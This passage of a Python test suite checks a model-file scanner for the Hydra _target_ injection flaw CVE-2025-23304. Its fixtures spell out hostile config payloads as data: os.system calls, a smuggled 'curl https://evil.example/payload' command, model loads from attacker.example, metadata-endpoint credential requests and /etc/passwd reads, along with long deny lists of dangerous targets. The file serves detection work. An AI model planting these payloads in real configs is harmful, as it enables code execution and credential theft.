                "remote_model_load_path",
            ),
            (
                "nemo.collections.asr.models.EncDecCTCModel.restore_from",
                {
                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.restore_from",
                    "restore_path": "checkpoints/model.nemo",
                    "override_config_path": {
                        "model": "${oc.create:'{_target_: os.system, command: id}'}",
                    },
                },
                "model.override_config_path.model",
                "interpolated_helper_argument",
            ),
            (
                "nemo.collections.asr.models.EncDecCTCModel.restore_from",
                {
                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.restore_from",
                    "restore_path": "msc://attacker.example/model.nemo",
                },
                "model.restore_path",
                "remote_model_load_path",
            ),
            (
                "nemo.collections.asr.models.EncDecCTCModel.from_pretrained",
                {
                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.from_pretrained",
                    "model_name": "/tmp/evil.nemo",
                },
                "model.model_name",
                "absolute_model_load_path",
            ),
            (
                "nemo.collections.asr.models.EncDecCTCModel.from_pretrained",
                {
                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.from_pretrained",
                    "override_config_path": "s3://attacker.example/config.yaml",
                },
                "model.override_config_path",
                "remote_model_load_path",
            ),
            (
                "nemo.collections.asr.models.EncDecCTCModel.from_pretrained",
                {
                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.from_pretrained",
                    "model_name": "attacker/model",
                },
                "model.model_name",
                "remote_model_load_path",
            ),
            (
                "pytorch_lightning.LightningModule.load_from_checkpoint",
                {
                    "_target_": "pytorch_lightning.LightningModule.load_from_checkpoint",
                    "hparams_file": "s3://attacker.example/hparams.yaml",
                },
                "model.hparams_file",
                "remote_model_load_path",
            ),
            (
                "nemo.collections.asr.models.EncDecCTCModel.restore_from",
                {
                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.restore_from",
                    "_args_": ["checkpoints/model.nemo", "s3://attacker.example/config.yaml"],
                },
                "model._args_[1]",
                "remote_model_load_path",
            ),
            (
                "pytorch_lightning.LightningModule.load_from_checkpoint",
                {
                    "_target_": "pytorch_lightning.LightningModule.load_from_checkpoint",
                    "_args_": ["checkpoints/model.ckpt", "cuda:0", "s3://attacker.example/hparams.yaml"],
                },
                "model._args_[2]",
                "remote_model_load_path",
            ),
        ],
    )
    def test_safe_prefixed_hydra_helper_arguments_with_dangerous_paths_are_cve(
        self,
        tmp_path: Path,
        target: str,
        target_config: dict[str, Any],
        expected_argument: str,
        expected_reason: str,
    ) -> None:
        """Safe-prefixed helpers must inspect model-controlled config and loader arguments."""
        path = _create_nemo_file(tmp_path, {"model": target_config})

        result = NemoScanner().scan(str(path))

        checks = [check for check in result.checks if check.name == "CVE-2025-23304: Dangerous Hydra helper argument"]
        assert len(checks) == 1
        check = checks[0]
        assert check.status == CheckStatus.FAILED
        assert check.severity == IssueSeverity.CRITICAL
        assert check.details["target"] == target
        assert check.details["argument"] == expected_argument
        assert check.details["reason"] == expected_reason
        assert check.details["cve_id"] == "CVE-2025-23304"
        assert not any(
            candidate.name == "Hydra _target_ Safety Check" and candidate.details.get("target") == target
            for candidate in result.checks
        )

    @pytest.mark.parametrize(
        ("target", "target_config"),
        [
            (
                "hydra.utils.call",
                {"_target_": "hydra.utils.call", "path": "os.system", "command": "id"},
            ),
            (
                "hydra.utils.instantiate",
                {"_target_": "hydra.utils.instantiate", "_args_": ["builtins.eval"]},
            ),
            (
                "hydra.utils.instantiate",
                {"_target_": "hydra.utils.instantiate", "_args_": ["literal", {"value": "still literal"}]},
            ),
            (
                "hydra.utils.instantiate",
                {
                    "_target_": "hydra.utils.instantiate",
                    "config": {
                        "_target_": "torch.nn.Identity",
                        "label": "identity",
                        "home": "${oc.env:HOME}",
                        "output_dir": "${hydra:runtime.output_dir}",
                    },
                },
            ),
            (
                "hydra.utils.instantiate",
                {
                    "_target_": "hydra.utils.instantiate",
                    "_recursive_": False,
                    "_args_": [{"_target_": "torch.nn.Identity"}, "${runtime.label}"],
                },
            ),
            (
                "hydra.utils.to_absolute_path",
                {"_target_": "hydra.utils.to_absolute_path", "path": "/etc/passwd"},
            ),
            (
                "omegaconf.OmegaConf.merge",
                {"_target_": "omegaconf.OmegaConf.merge", "config": "conf;curl https://evil.example/payload"},
            ),
            (
                "nemo.collections.asr.models.EncDecCTCModel.restore_from",
                {
                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.restore_from",
                    "restore_path": "checkpoints/model.ckpt",
                    "metadata": {"path": "../../inert.txt", "name": "os.system"},
                },
            ),
            (
                "nemo.collections.asr.models.EncDecCTCModel.restore_from",
                {
                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.restore_from",
                    "restore_path": "models/../checkpoints/model.ckpt",
                    "model_path": "../../inert-model-path",
                    "RESTORE_PATH": "../inert-uppercase-key",
                    "restore-path": "../inert-hyphen-key",
                },
            ),
            (
                "nemo.collections.asr.models.EncDecCTCModel.from_pretrained",
                {
                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.from_pretrained",
                    "model_name": "stt_en_conformer_ctc_small",
                    "override_config_path": "configs/model.yaml",
                },
            ),
            (
                "nemo.collections.asr.models.EncDecCTCModel.from_pretrained",
                {
                    "_target_": "nemo.collections.asr.models.EncDecCTCModel.from_pretrained",
                    "_args_": ["stt_en_conformer_ctc_small", "s3://truthy-refresh-cache", "configs/model.yaml"],
                },
            ),
        ],
    )
    def test_safe_prefixed_hydra_helper_argument_near_matches_remain_safe(
        self,
        tmp_path: Path,
        target: str,
        target_config: dict[str, Any],
    ) -> None:
        """Inert helper data and API-required paths should not become CVE findings."""
        path = _create_nemo_file(tmp_path, {"model": target_config})

        result = NemoScanner().scan(str(path))

        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra helper argument" for check in result.checks)
        assert any(
            check.name == "Hydra _target_ Safety Check"
            and check.status == CheckStatus.PASSED
            and check.details.get("target") == target
            for check in result.checks
        )

    @pytest.mark.parametrize(
        ("checkpoint_dir", "expected_reason"),
        [
            ("checkpoints", None),
            ("/tmp", "absolute_model_load_path"),
            ("s3://attacker.example", "remote_model_load_path"),
        ],
    )
    def test_model_loader_simple_interpolation_is_statically_classified(
        self,
        tmp_path: Path,
        checkpoint_dir: str,
        expected_reason: str | None,
    ) -> None:
        """Root config references should be resolved before path classification."""
        target = "nemo.collections.asr.models.EncDecCTCModel.load_from_checkpoint"
        path = _create_nemo_file(
            tmp_path,
            {
                "checkpoint_dir": checkpoint_dir,
                "model": {
                    "_target_": target,
                    "checkpoint_path": "${checkpoint_dir}/model.ckpt",
                },
            },
        )

        result = NemoScanner().scan(str(path))
        checks = [check for check in result.checks if check.name == "CVE-2025-23304: Dangerous Hydra helper argument"]

        if expected_reason is None:
            assert checks == []
            assert any(
                check.name == "Hydra _target_ Safety Check" and check.details.get("target") == target
                for check in result.checks
            )
        else:
            assert len(checks) == 1
            assert checks[0].details["reason"] == expected_reason

    @pytest.mark.parametrize(
        ("payload", "expected_finding"),
        [
            ("safe-label", False),
            (None, False),
            ("${oc.create:'{_target_: os.system, command: id}'}", True),
        ],
    )
    def test_structured_helper_plain_reference_is_followed(
        self,
        tmp_path: Path,
        payload: Any,
        expected_finding: bool,
    ) -> None:
        """Plain references must inherit the security semantics of their source value."""
        target = "hydra.utils.instantiate"
        path = _create_nemo_file(
            tmp_path,
            {
                "payload": payload,
                "model": {
                    "_target_": target,
                    "config": {"_target_": "torch.nn.Identity", "label": "${payload}"},
                },
            },
        )

        result = NemoScanner().scan(str(path))
        checks = [check for check in result.checks if check.name == "CVE-2025-23304: Dangerous Hydra helper argument"]

        assert bool(checks) is expected_finding

    def test_nested_dangerous_target_under_hydra_helper_remains_detected(self, tmp_path: Path) -> None:
        """Nested configs remain covered by normal recursive _target_ traversal."""
        target = "os.system"
        path = _create_nemo_file(
            tmp_path,
            {
                "model": {
                    "_target_": "hydra.utils.instantiate",
                    "config": {"_target_": target, "command": "id"},
                }
            },
        )

        result = NemoScanner().scan(str(path))

        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.severity == IssueSeverity.CRITICAL
            and check.details.get("target") == target
            for check in result.checks
        )
        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra helper argument" for check in result.checks)

    def test_large_literal_dynamic_helper_config_is_inconclusive(self, tmp_path: Path) -> None:
        """Helper coverage exhaustion must be operational, not a confirmed CVE."""
        target = "hydra.utils.instantiate"
        config = {f"value_{index}": "safe" for index in range(1025)}
        path = _create_nemo_file(
            tmp_path,
            {"model": {"_target_": target, "config": config}},
        )

        result = NemoScanner().scan(str(path))
        aggregate_result = scan_model_directory_or_file(str(path), config={"cache_scan_results": False})

        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra helper argument" for check in result.checks)
        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_helper_config_traversal_node_limit" in result.metadata["scan_outcome_reasons"]
        assert determine_exit_code(aggregate_result) == 2

    def test_dynamic_helper_late_positional_interpolation_remains_safe(self, tmp_path: Path) -> None:
        """Only the first Hydra helper positional value supplies the nested config."""
        target = "hydra.utils.instantiate"
        path = _create_nemo_file(
            tmp_path,
            {
                "model": {
                    "_target_": target,
                    "_recursive_": False,
                    "_args_": [{"_target_": "torch.nn.Identity"}, "${runtime.label}"],
                }
            },
        )

        result = NemoScanner().scan(str(path))

        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra helper argument" for check in result.checks)

    def test_model_loader_irrelevant_positional_tail_remains_safe(self, tmp_path: Path) -> None:
        """Arguments beyond documented path slots must not be classified as load paths."""
        target = "nemo.collections.asr.models.EncDecCTCModel.restore_from"
        positional_values = ["checkpoints/model.nemo", "configs/model.yaml"] + ["literal"] * 1022
        positional_values.append("s3://inert.example/not-a-loader-argument")
        path = _create_nemo_file(
            tmp_path,
            {
                "model": {
                    "_target_": target,
                    "_args_": positional_values,
                }
            },
        )

        result = NemoScanner().scan(str(path))

        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra helper argument" for check in result.checks)

    def test_structured_override_scan_limit_is_inconclusive(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Helper coverage exhaustion must be operational, not a confirmed CVE."""
        monkeypatch.setattr(nemo_scanner_module, "_HYDRA_DYNAMIC_CONFIG_SCAN_NODES", 8)
        target = "nemo.collections.asr.models.EncDecCTCModel.restore_from"
        path = _create_nemo_file(
            tmp_path,
            {
                "model": {
                    "_target_": target,
                    "restore_path": "checkpoints/model.nemo",
                    "override_config_path": {f"value_{index}": "safe" for index in range(16)},
                }
            },
        )

        result = NemoScanner().scan(str(path))
        aggregate_result = scan_model_directory_or_file(str(path), config={"cache_scan_results": False})

        assert result.success is False
        assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
        assert "nemo_helper_config_traversal_node_limit" in result.metadata["scan_outcome_reasons"]
        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra helper argument" for check in result.checks)
        traversal_check = next(check for check in result.checks if check.name == "NeMo Config Traversal")
        assert traversal_check.details["max_traversal_nodes"] == 8
        assert determine_exit_code(aggregate_result) == 2

    def test_structured_override_alias_is_scanned_once(self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
        """Repeated helper aliases must share traversal accounting."""
        monkeypatch.setattr(nemo_scanner_module, "_HYDRA_DYNAMIC_CONFIG_SCAN_NODES", 4)
        target = "nemo.collections.asr.models.EncDecCTCModel.restore_from"
        helpers = "\n".join(
            f"  - _target_: {target}\n    restore_path: checkpoints/model.nemo\n    override_config_path: *override"
            for _ in range(16)
        )
        path = _create_nemo_file_from_bytes(
            tmp_path,
            (f'shared: &override\n  model:\n    width: "${{oc.env:MODEL_WIDTH}}"\nhelpers:\n{helpers}\n').encode(),
        )

        result = NemoScanner().scan(str(path))

        assert result.success is True
        assert "nemo_helper_config_traversal_node_limit" not in result.metadata.get("scan_outcome_reasons", [])
        assert not any(check.name == "CVE-2025-23304: Dangerous Hydra helper argument" for check in result.checks)

    @pytest.mark.parametrize(
        "checkpoint_path",
        [
            "https://evil.example/payload.ckpt",
            "file:///etc/passwd",
            "s3://attacker.example/payload.ckpt",
        ],
    )
    def test_model_loader_remote_checkpoint_uri_is_cve(self, tmp_path: Path, checkpoint_path: str) -> None:
        """Remote checkpoint loaders must not bypass safe target-prefix handling."""
        target = "pytorch_lightning.LightningModule.load_from_checkpoint"
        path = _create_nemo_file(
            tmp_path,
            {"model": {"_target_": target, "checkpoint_path": checkpoint_path}},
        )

        result = NemoScanner().scan(str(path))

        checks = [check for check in result.checks if check.name == "CVE-2025-23304: Dangerous Hydra helper argument"]
        assert len(checks) == 1
        assert checks[0].details["target"] == target
        assert checks[0].details["reason"] == "remote_model_load_path"

    def test_model_loader_absolute_path_fails_aggregate_scan(self, tmp_path: Path) -> None:
        """Host-path model loads must retain security exit-code precedence."""
        target = "nemo.collections.asr.models.EncDecCTCModel.restore_from"
        path = _create_nemo_file(
            tmp_path,
            {"model": {"_target_": target, "restore_path": "/tmp/model.ckpt"}},
        )

        result = scan_model_directory_or_file(str(path), config={"cache_scan_results": False})

        assert any(
            issue.severity == IssueSeverity.CRITICAL
            and issue.details.get("target") == target
            and issue.details.get("reason") == "absolute_model_load_path"
            for issue in result.issues
        )
        assert determine_exit_code(result) == 1

    @pytest.mark.parametrize(
        "target",
        [
            "hydra.compose",
            "hydra.core.config_store.ConfigStore.store",
            "hydra.core.global_hydra.GlobalHydra.clear",
            "hydra.core.utils.run_job",
            "hydra.utils.get_object",
            "omegaconf.OmegaConf.register_new_resolver",
            "transformers.dynamic_module_utils.get_class_from_dynamic_module",
            "transformers.dynamic_module_utils.check_python_requirements",
            "transformers.dynamic_module_utils.resolve_trust_remote_code",
            "transformers.pipelines.audio_utils.ffmpeg_read",
            "transformers.utils.hub.cached_file",
            "transformers.utils.hub.requests.get",
            "transformers.utils.import_utils.direct_transformers_import",
            "transformers.Trainer.push_to_hub",
            "transformers.PreTrainedModel.save_pretrained",
            "numpy.recarray.tofile",
            "numpy.load.__call__",
        ],
    )
    def test_safe_namespace_side_effect_targets_fail_aggregate_scan(self, tmp_path: Path, target: str) -> None:
        """Representative trusted-namespace side effects must retain security exit-code precedence."""
        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})

        result = scan_model_directory_or_file(str(path), config={"cache_scan_results": False})

        assert any(
            issue.severity == IssueSeverity.CRITICAL and issue.details.get("target") == target
            for issue in result.issues
        )
        assert determine_exit_code(result) == 1

    @pytest.mark.parametrize(
        "target",
        [
            "ftplib.FTP",
            "ftplib.FTP_TLS",
            "ftplib.FTP.connect",
            "ftplib.FTP_TLS.connect",
            "imaplib.IMAP4",
            "imaplib.IMAP4_SSL",
            "imaplib.IMAP4.open",
            "imaplib.IMAP4_SSL.open",
            "nntplib.NNTP",
            "nntplib.NNTP_SSL",
            "poplib.POP3",
            "poplib.POP3_SSL",
            "smtplib.LMTP",
            "smtplib.LMTP.connect",
            "smtplib.SMTP",
            "smtplib.SMTP_SSL",
            "smtplib.SMTP.connect",
            "smtplib.SMTP_SSL.connect",
            "telnetlib.Telnet",
            "telnetlib.Telnet.open",
            "bz2.open",
            "bz2.BZ2File",
            "dbm.open",
            "gzip.open",
            "gzip.GzipFile",
            "lzma.open",
            "lzma.LZMAFile",
            "shelve.open",
            "sqlite3.connect",
            "sqlite3.Connection",
            "tarfile.open",
            "tarfile.TarFile",
            "tarfile.TarFile.open",
            "tempfile.NamedTemporaryFile",
            "tempfile.TemporaryDirectory",
            "tempfile.TemporaryFile",
            "tempfile.mkdtemp",
            "tempfile.mkstemp",
            "zipfile.PyZipFile",
            "zipfile.ZipFile",
            "_ctypes.dlopen",
            "ctypes.OleDLL",
            "ctypes.PyDLL",
            "ctypes.WinDLL",
            "ctypes._dlopen",
            "ctypes.cdll.LoadLibrary",
            "ctypes.oledll.LoadLibrary",
            "ctypes.pydll.LoadLibrary",
            "ctypes.windll.LoadLibrary",
            "ctypes.cdll.attacker_library",
            "ctypes.pythonapi.PyRun_AnyFile",
            "ctypes.pythonapi.PyRun_AnyFileEx",
            "ctypes.pythonapi.PyRun_AnyFileExFlags",
            "ctypes.pythonapi.PyRun_AnyFileFlags",
            "ctypes.pythonapi.PyRun_File",
            "ctypes.pythonapi.PyRun_FileEx",
            "ctypes.pythonapi.PyRun_FileFlags",
            "ctypes.pythonapi.PyRun_SimpleString",
            "ctypes.pythonapi.PyRun_SimpleStringFlags",
            "ctypes.pythonapi.PyRun_String",
            "ctypes.pythonapi.PyRun_StringFlags",
            "ctypes.pythonapi.PyRun_FileExFlags",
            "ctypes.pythonapi.PyRun_InteractiveLoop",
            "ctypes.pythonapi.PyRun_InteractiveLoopFlags",
            "ctypes.pythonapi.PyRun_InteractiveOne",
            "ctypes.pythonapi.PyRun_InteractiveOneFlags",
            "ctypes.pythonapi.PyRun_SimpleFile",
            "ctypes.pythonapi.PyRun_SimpleFileEx",
            "ctypes.pythonapi.PyRun_SimpleFileExFlags",
            "ctypes.util.find_library",
            "numpy.ctypeslib.load_library",
            "tensorflow.load_op_library",
            "torch.classes.load_library",
            "torch.ops.load_library",
            "zipfile.Path",
            "importlib.machinery.SourceFileLoader.load_module",
            "importlib.machinery.SourceFileLoader.exec_module",
            "importlib.machinery.SourcelessFileLoader.load_module",
            "importlib.machinery.SourcelessFileLoader.exec_module",
            "importlib.machinery.ExtensionFileLoader.load_module",
            "importlib.machinery.ExtensionFileLoader.exec_module",
            "zipimport.zipimporter.load_module",
            "zipimport.zipimporter.exec_module",
            "ssl.SSLContext.load_cert_chain",
            "ssl.SSLContext.load_verify_locations",
            "ssl.create_default_context",
            "configparser.ConfigParser.read",
            "configparser.RawConfigParser.read",
            "filecmp.cmp",
            "filecmp.cmpfiles",
            "pydoc.importfile",
        ],
    )
    def test_reviewed_constructor_and_loader_aliases_are_dangerous(self, tmp_path: Path, target: str) -> None:
        """Immediate network, file, and native-loader aliases must fail security review."""
        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})

        result = NemoScanner().scan(str(path))

        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.CRITICAL
            and check.details.get("target") == target
            for check in result.checks
        )
        assert not any(
            check.name == "Hydra _target_ Review" and check.details.get("target") == target for check in result.checks
        )

    @pytest.mark.parametrize(
        "target",
        [
            "tempfile.mktemp",
            "socket.create_server",
            "nntplib.NNTP._create_socket",
            "nntplib.NNTP_SSL._create_socket",
            "poplib.POP3._create_socket",
            "poplib.POP3_SSL._create_socket",
            "pathlib.Path.iterdir",
            "pathlib.PosixPath.iterdir",
            "pathlib.WindowsPath.iterdir",
        ],
    )
    def test_immediate_creator_connection_and_discovery_aliases_are_dangerous(
        self,
        tmp_path: Path,
        target: str,
    ) -> None:
        """Immediate filesystem, network, and process-backed aliases must fail security review."""
        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})

        result = NemoScanner().scan(str(path))

        assert any(
            check.name == "CVE-2025-23304: Dangerous Hydra _target_"
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.CRITICAL
            and check.details.get("target") == target
            for check in result.checks
        )
        assert not any(
            check.name == "Hydra _target_ Review" and check.details.get("target") == target for check in result.checks
        )

    @pytest.mark.parametrize(
        "target",
        [
            "custom.ftplib.FTPFactory.SafeBuilder",
            "custom.gzip.GzipFileFactory.SafeBuilder",
            "custom.numpy.fromfile_factory.SafeBuilder",
            "custom.tarfile.open_safe.SafeBuilder",
            "custom.tempfile.NamedTemporaryFileFactory.SafeBuilder",
            "custom.ctypes.PyDLLFactory.SafeBuilder",
            "custom.ftplib.FTP.connect_factory.SafeBuilder",
            "custom.pathlib.Path.iterdir_factory.SafeBuilder",
            "custom.ctypes.util.find_library_factory.SafeBuilder",
            "custom.numpy.lib.npyio.NpzFileFactory.SafeBuilder",
            "custom.zipfile.PathFactory.SafeBuilder",
            "custom.importlib.SourceFileLoaderFactory.SafeBuilder",
            "custom.ssl.SSLContextFactory.SafeBuilder",
            "custom.ssl.create_default_context_factory.SafeBuilder",
            "custom.configparser.ConfigParserFactory.SafeBuilder",
            "custom.filecmp.cmp_factory.SafeBuilder",
            "custom.pydoc.importfile_factory.SafeBuilder",
            "custom.ctypes.pythonapi.PyRun_StringFactory.SafeBuilder",
            "ctypes.pythonapi.PyRun_Custom",
            "custom.shutil.which_factory.SafeBuilder",
            "custom.logging.config.dictConfigFactory.SafeBuilder",
            "custom.site.addsitedir_factory.SafeBuilder",
            "custom.linecache.getline_factory.SafeBuilder",
            "custom.logging.FileHandlerFactory.SafeBuilder",
            "custom.omegaconf.OmegaConf.load_factory.SafeBuilder",
            "custom.tokenize.open_factory.SafeBuilder",
            "custom.importlib.resources.read_binary_factory.SafeBuilder",
            "custom.pkgutil.get_data_factory.SafeBuilder",
            "custom.os.add_dll_directory_factory.SafeBuilder",
        ],
    )
    def test_constructor_and_loader_near_matches_remain_review_only(self, tmp_path: Path, target: str) -> None:
        """Exact alias coverage should not promote similarly named custom factories."""
        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})

        result = NemoScanner().scan(str(path))

        assert not any(check.name.startswith("CVE-2025-23304") for check in result.checks)
        assert any(
            check.name == "Hydra _target_ Review"
            and check.status == CheckStatus.FAILED
            and check.severity == IssueSeverity.INFO
            and check.details.get("target") == target
            for check in result.checks
        )

    @pytest.mark.parametrize(
        ("target", "target_config"),
        [
            (
                "urllib.request.urlretrieve",
                {
                    "_target_": "urllib.request.urlretrieve",
                    "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "filename": "__MODELAUDIT_TMP__/modelaudit-nemo-download",
                },
            ),
            (
                "socket.create_connection",
                {
                    "_target_": "socket.create_connection",
                    "_args_": [["169.254.169.254", 80]],
                },
            ),
            (
                "socket.getaddrinfo",
                {
                    "_target_": "socket.getaddrinfo",
                    "_args_": ["attacker.example", 443],
                },
            ),
            (
                "requests.api.get",
                {
                    "_target_": "requests.api.get",
                    "url": "http://169.254.169.254/latest/meta-data/",
                },
            ),
            (
                "requests.sessions.Session.get",
                {
                    "_target_": "requests.sessions.Session.get",
                    "url": "http://169.254.169.254/latest/meta-data/",
                },
            ),
            (
                "httpx.Client.get",
                {
                    "_target_": "httpx.Client.get",
                    "url": "http://169.254.169.254/latest/meta-data/",
                },
            ),
            (
                "urllib3.request",
                {
                    "_target_": "urllib3.request",
                    "method": "GET",
                    "url": "http://169.254.169.254/latest/meta-data/",
                },
            ),
            (
                "urllib3.connectionpool.HTTPConnectionPool.request",
                {
                    "_target_": "urllib3.connectionpool.HTTPConnectionPool.request",
                    "method": "GET",
                    "url": "http://169.254.169.254/latest/meta-data/",
                },
            ),
            (
                "urllib3.poolmanager.PoolManager.request",
                {
                    "_target_": "urllib3.poolmanager.PoolManager.request",
                    "method": "GET",
                    "url": "http://169.254.169.254/latest/meta-data/",
                },
            ),
            (
                "urllib.request.URLopener.retrieve",
                {
                    "_target_": "urllib.request.URLopener.retrieve",
                    "_args_": [
                        "http://169.254.169.254/latest/meta-data/",
                        "__MODELAUDIT_TMP__/modelaudit-nemo-download",
                    ],
                },
            ),
            (
                "urllib.request.URLopener.open_http",
                {
                    "_target_": "urllib.request.URLopener.open_http",
                    "_args_": ["http://169.254.169.254/latest/meta-data/"],
                },
            ),
            (
                "http.client.HTTPConnection.connect",
                {
                    "_target_": "http.client.HTTPConnection.connect",
                    "_args_": [{"_target_": "http.client.HTTPConnection", "host": "169.254.169.254"}],
                },
            ),
            (
                "socket.socket.connect",
                {
                    "_target_": "socket.socket.connect",
                    "_args_": [["169.254.169.254", 80]],
                },
            ),
            (
                "_socket.socket.sendto",
                {
                    "_target_": "_socket.socket.sendto",
                    "_args_": [{"_target_": "_socket.socket"}, b"GET /", ["169.254.169.254", 80]],
                },
            ),
            (
                "_socket.SocketType.connect",
                {
                    "_target_": "_socket.SocketType.connect",
                    "_args_": [["169.254.169.254", 80]],
                },
            ),
            (
                "_io.FileIO",
                {
                    "_target_": "_io.FileIO",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-write", "w"],
                },
            ),
            (
                "io.FileIO",
                {
                    "_target_": "io.FileIO",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-write", "w"],
                },
            ),
            (
                "_io.open",
                {
                    "_target_": "_io.open",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-write", "w"],
                },
            ),
            (
                "codecs.open",
                {
                    "_target_": "codecs.open",
                    "_args_": ["modelaudit-nemo-write", "w"],
                },
            ),
            (
                "io.open_code",
                {
                    "_target_": "io.open_code",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret.py"],
                },
            ),
            (
                "posix.open",
                {
                    "_target_": "posix.open",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-write", 65],
                },
            ),
            (
                "os.write",
                {
                    "_target_": "os.write",
                    "_args_": [1, "payload"],
                },
            ),
            (
                "os.listdir",
                {
                    "_target_": "os.listdir",
                    "_args_": ["__MODELAUDIT_TMP__/"],
                },
            ),
            (
                "glob.glob",
                {
                    "_target_": "glob.glob",
                    "_args_": ["__MODELAUDIT_TMP__/*"],
                },
            ),
            (
                "os.path.exists",
                {
                    "_target_": "os.path.exists",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret"],
                },
            ),
            (
                "pathlib.Path.exists",
                {
                    "_target_": "pathlib.Path.exists",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret"],
                },
            ),
            (
                "pathlib.PosixPath.write_text",
                {
                    "_target_": "pathlib.PosixPath.write_text",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-write", "payload"],
                },
            ),
            (
                "pathlib.PosixPath.read_text",
                {
                    "_target_": "pathlib.PosixPath.read_text",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret"],
                },
            ),
            (
                "pathlib.PosixPath.read_bytes",
                {
                    "_target_": "pathlib.PosixPath.read_bytes",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-secret"],
                },
            ),
            (
                "os.rename",
                {
                    "_target_": "os.rename",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-source", "__MODELAUDIT_TMP__/modelaudit-nemo-dest"],
                },
            ),
            (
                "os.replace",
                {
                    "_target_": "os.replace",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-source", "__MODELAUDIT_TMP__/modelaudit-nemo-dest"],
                },
            ),
            (
                "pathlib.Path.symlink_to",
                {
                    "_target_": "pathlib.Path.symlink_to",
                    "_args_": ["__MODELAUDIT_TMP__/modelaudit-nemo-link", "__MODELAUDIT_TMP__/modelaudit-nemo-target"],
                },
            ),
        ],
    )
    def test_network_and_file_access_targets_fail_aggregate_scan(
        self,
        tmp_path: Path,
        target: str,
        target_config: dict[str, Any],
    ) -> None:
        """SSRF and file-access Hydra targets should produce aggregate exit 1."""
        config = {"model": _materialize_tmp_paths(target_config, tmp_path)}
        path = _create_nemo_file(tmp_path, config)

        result = scan_model_directory_or_file(
            str(path),
            config={"cache_scan_results": False},
        )

        assert any(
            issue.severity == IssueSeverity.CRITICAL and issue.details.get("target") == target
            for issue in result.issues
        )
        assert determine_exit_code(result) == 1

    @pytest.mark.parametrize(
        "target",
        [
            "http.client.HTTPConnection.endheaders",
            "socket.socket.sendfile",
            "smtplib.SMTP",
            "ftplib.FTP.connect",
            "gzip.GzipFile",
            "ctypes.util.find_library",
            "numpy.lib._datasource.DataSource.open",
            "numpy.lib._npyio_impl.load",
            "tarfile.open",
            "tempfile.NamedTemporaryFile",
            "ctypes.PyDLL",
            "ctypes.pythonapi.PyRun_SimpleString",
            "ctypes.pythonapi.PyRun_String",
            "numpy.lib.npyio.NpzFile",
            "socket.socket.bind",
            "socketserver.TCPServer",
            "os.fork",
            "os.kill",
            "sys.exit",
            "signal.signal",
            "os.chdir",
            "os.umask",
            "os.chroot",
            "asyncio.run",
            "multiprocessing.Pool",
            "multiprocessing.connection.Client",
            "multiprocessing.managers.BaseManager.start",
            "os.putenv",
            "os.environ.update",
            "resource.setrlimit",
            "importlib.resources.read_binary",
            "os.add_dll_directory",
            "configparser.ConfigParser.read",
            "torch.ops.load_library",
            "zipfile.Path",
            "importlib.machinery.SourceFileLoader.load_module",
            "webbrowser.open_new",
            "ssl.SSLContext.load_cert_chain",
            "ssl.create_default_context",
            "filecmp.cmp",
            "pydoc.importfile",
            "os.path.realpath",
            "os.chmod",
            "pathlib.Path.iterdir",
            "pathlib.Path.resolve",
            "shutil.unpack_archive",
            "shutil.which",
            "logging.config.dictConfig",
            "omegaconf.OmegaConf.load",
            "site.addsitedir",
            "logging.FileHandler",
            "linecache.getline",
            "torch.save",
            "tarfile.TarFile.extractall",
            "os.close",
            "sys.modules.clear",
            "transformers.pipeline",
            "transformers.AutoModel.from_pretrained",
            "socket.socket",
            "os.pipe",
        ],
    )
    def test_additional_immediate_io_targets_fail_aggregate_scan(self, tmp_path: Path, target: str) -> None:
        """Representative added I/O aliases should retain security exit-code precedence."""
        path = _create_nemo_file(tmp_path, {"model": {"_target_": target}})

        result = scan_model_directory_or_file(str(path), config={"cache_scan_results": False})

        assert any(
            issue.severity == IssueSeverity.CRITICAL and issue.details.get("target") == target
            for issue in result.issues
        )
        assert determine_exit_code(result) == 1

    @pytest.mark.parametrize(
        "target",
        [
            "os.execlpe",
            "os.spawnlp",
            "os.spawnlpe",
            "os.spawnv",
            "os.spawnve",
            "os.spawnvp",
            "os.spawnvpe",
            "nt.spawnv",
            "nt.spawnve",
            "os.posix_spawn",
            "os.posix_spawnp",
            "posix.execv",
            "posix.execve",
            "os.fork",
            "posix.fork",
            "os.forkpty",
            "posix.forkpty",
